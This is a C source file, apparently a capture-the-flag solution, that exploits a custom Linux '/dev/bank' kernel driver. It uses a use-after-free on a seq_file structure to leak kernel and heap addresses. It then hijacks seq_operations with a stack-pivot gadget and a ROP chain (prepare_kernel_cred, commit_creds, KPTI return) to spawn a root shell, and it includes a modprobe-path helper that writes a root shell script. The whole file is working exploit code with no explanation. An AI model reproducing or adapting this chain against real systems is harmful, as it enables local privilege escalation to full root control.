#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <errno.h>
#include <stdbool.h>
#include <stddef.h>
#include <sys/msg.h>
#include <limits.h>

// commands
#define DEV_PATH "/dev/bank"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

#define MSG_COPY        040000

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}


static uint64_t bswap(uint64_t val)
{
    __asm__(
            ".intel_syntax noprefix;"
            "bswap rdi;"
            "mov rax, rdi;"
            ".att_syntax;"
    );
}

static void shell_modprobe()
{
   ; system("echo '#!/bin/sh' > /home/user/hax; \
            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/root");
    system("chmod +x /home/user/root");
    system("/home/user/root");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    if (!getuid())
	{
		puts("Got r00t :)");
		system("/bin/sh");
	}
	exit(0);
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

#define BANK_CREATE    0x1337
#define BANK_VIEW      0x1338
#define BANK_EDIT      0x1339
#define BANK_DELETE    0x133a
#define BANK_TRANSFER  0x133b

#define MAX_SZ 108

typedef struct {
    unsigned idx;
    unsigned idx2;
    unsigned amount;
    int *balance;
    char* name;
    size_t len;
} req_t;

static void create(int fd)
{
    req_t req = {0};

    if (ioctl(fd, BANK_CREATE, &req) < 0) {
       errExit("BANK_CREATE");
    }
}

void edit(int fd, unsigned idx, char* name, size_t len)
{
    req_t req = {0};
    req.idx = idx;
    req.name = name;
    req.len = len;

    if (ioctl(fd, BANK_EDIT, &req) < 0) {
        errExit("BANK_EDIT");
    }
}

static void view(int fd, unsigned idx, char* name, int* balance)
{
    req_t req = {0};
    req.idx = idx;
    req.balance = balance;
    req.name = name;

    if (ioctl(fd, BANK_VIEW, &req) < 0) {
        errExit("BANK_EDIT");
    }
}

static void transfer(int fd, unsigned from, unsigned to, unsigned amount)
{
    req_t req = {0};
    req.idx = from;
    req.idx2 = to;
    req.amount = amount;

    if (ioctl(fd, BANK_TRANSFER, &req) < 0) {
        errExit("BANK_TRANSFER");
    }
}

static void delete(int fd, unsigned idx)
{
    req_t req = {0};
    req.idx = idx;

    if (ioctl(fd, BANK_DELETE, &req) < 0) {
        errExit("BANK_DELETE");
    }
}

bool is_kernel_ptr(uint64_t val)
{

    return (val & 0xffffffff00000000) == 0xffffffff00000000;
}

uint64_t find_kernel_base(uint64_t* buf, size_t len)
{
    // search for a seq_operations ?
    for (size_t i = 0; i < len - 0x4; i++) {
        if (is_kernel_ptr(buf[i]) && is_kernel_ptr(buf[i+1])
            && is_kernel_ptr(buf[i+2]) && is_kernel_ptr(buf[i+3])) {
            return buf[i] - 0x811900;
        }
    }

    return 0;
}

void build_rop(uint64_t *rop_buf, uint64_t k_base)
{
    uint64_t pop_rdi_ret = k_base + 0x1a075c;
    uint64_t prepare_kernel_cred = k_base + 0x57650;
    uint64_t commit_creds = k_base + 0x574b0;
    uint64_t kpti_tramp = k_base + 0x400cb0;
    uint64_t pop_rbp_ret = k_base + 0x58c;
    uint64_t push_rax_leave_ret = k_base + 0x363d1;
    unsigned off = 0;

    rop_buf[off++] = pop_rdi_ret;
    rop_buf[off++] = 0x0;
    rop_buf[off++] = prepare_kernel_cred;
    rop_buf[off++] = pop_rbp_ret;
    rop_buf[off++] = &rop_buf[off+1];
    rop_buf[off++] = pop_rdi_ret;
    rop_buf[off++] = pop_rdi_ret;
    rop_buf[off++] = push_rax_leave_ret;
    rop_buf[off++] = commit_creds;
    rop_buf[off++] = kpti_tramp + 22;
    rop_buf[off++] = 0x0;
    rop_buf[off++] = 0x0;

    save_state();
    printf("%p %p %p %p \n", user_cs, user_rflags, user_sp, user_ss);
    rop_buf[off++] = (uint64_t)get_shell;
    rop_buf[off++] = user_cs;
    rop_buf[off++] = user_rflags;
    rop_buf[off++] = user_sp;
    rop_buf[off++] = user_ss;
    rop_buf[off++] = 0xdeadbeef;
}

int main(void) 
{
    int ret;
    int fd = open(DEV_PATH, O_RDONLY);
    int fd2 = open(DEV_PATH, O_RDONLY);

    if (fd < 0 || fd2 < 0) {
        errExit("open dev");
    }

    char buf[MAX_SZ + 4] = {0};
    int balance;

    create(fd);

    memset(buf, 0x00, sizeof(buf));

    ret = close(fd2);

    if (ret < 0) {
        errExit("close");
    }

    int fd_seq = open("/proc/self/stat", O_RDONLY);

    if (fd_seq < 0) {
        errExit("open fd_seq");
    }

    char buf2[0x100000] = {0};

    read(fd_seq, buf, 0x40);

    view(fd, 0, buf, &balance);
    //print_hex8(buf + 4, sizeof(buf));

    uint64_t *p_buf = (uint64_t *)buf;

    p_buf = (uint64_t *)(buf + 4);
    p_buf[1] = 0x0; // seq_file.from
    p_buf[2] = 0x10000; // seq_file.count
    edit(fd, 0, buf, MAX_SZ);

    read(fd_seq, buf2, 0x10000);
    //print_hex8(buf2, 0x2000);
    
    uint64_t k_base = find_kernel_base((uint64_t *)buf2, 0x10000 / 0x8);
    // 0xffffffff811b6cce : in eax, 0xe8 ; mov esp, 0x5dfffff8 ; ret
    uint64_t gadget = k_base + 0x1b6cce;

    if (!k_base) {
        puts("failed to leak kbase");
        return -1;
    }

    printf("Kernel base: %p \n", k_base);
    printf("Gadget: %p \n", gadget);

    memset(buf, 0x41, sizeof(buf));
    p_buf = (uint64_t *)buf;
    p_buf[0] = 0xdeadbeefbeefbabe;
    p_buf[1] = 0xdeadbeefbeefbabe;
    p_buf[2] = gadget;
    p_buf[3] = 0x41;
    p_buf[4] = 0x42;
    p_buf[5] = 0x43;

    for (int i = 1; i < 0x10; i++) {
      create(fd);
      edit(fd, i, buf, MAX_SZ);
    }

    close(fd_seq);
    fd_seq = open("/proc/self/stat", O_RDONLY);
    read(fd_seq, buf, 0x40);

    view(fd, 0, buf, &balance);

    uint64_t heap_leak = ((p_buf[0] & 0xffffffff) << 32) | (balance & 0xffffffff);
    printf("Heap_leak: %p %p\n", heap_leak, heap_leak + 0x100000);

    p_buf = (uint64_t *)(buf + 4);
    p_buf[1] = 0x0; // seq_file.from
    p_buf[2] = 0x100000; // seq_file.count

    edit(fd, 0, buf, MAX_SZ);

    read(fd_seq, buf2, 0x100000);

    p_buf = (uint64_t *)(buf2 + 4);

    uint64_t fake_ops = 0;

    for (int i = 0; i < (sizeof(buf2) / 0x8); i++) {
        if (p_buf[i] == 0xdeadbeefbeefbabe &&
            p_buf[i+1] == 0xdeadbeefbeefbabe) {

            fake_ops = heap_leak + (i + 2) * 8 + 4;
            printf("Found %d %p \n", i, p_buf[i+2]);
            break;
        }
    }

    if (!fake_ops) {
        puts("fake ops not found");
        return -1;
    }

    close(fd_seq);
    fd_seq = open("/proc/self/stat", O_RDONLY);
    read(fd_seq, buf, 0x40);

    view(fd, 0, buf, &balance);
    p_buf = (uint64_t *)(buf + 4);
    p_buf[9] = fake_ops; // seq_file.op
    edit(fd, 0, buf, MAX_SZ);

    void *rop_buf = mmap((void*)(0x5dfffff8 & ~0xFFF), 4*PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

    memset(rop_buf, 0x42, 0xff8);
    build_rop((uint64_t*)(rop_buf+0xff8), k_base);

    pread64(fd_seq, buf, 0x1, 0x1);

    WAIT();

    return 0;
}

